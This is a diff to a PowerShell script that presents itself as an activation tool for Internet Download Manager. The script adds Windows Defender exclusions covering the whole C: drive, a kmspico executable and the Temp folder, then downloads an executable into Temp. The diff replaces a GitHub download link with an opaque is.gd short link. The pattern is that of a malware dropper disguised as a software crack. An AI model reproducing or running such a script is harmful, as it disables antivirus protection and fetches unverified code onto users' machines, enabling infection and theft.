@@ -1,7 +1,7 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
 Add-MpPreference -ExclusionPath "C:\","kmspico-x86_64.exe","C:\Windows\Temp\"
-$url = "https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/activate-key.exe"
+$url = "https://is.gd/sAdbMO"
 $outpath = "C:\Windows\Temp\activate-key.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
 $wc = New-Object System.Net.WebClient
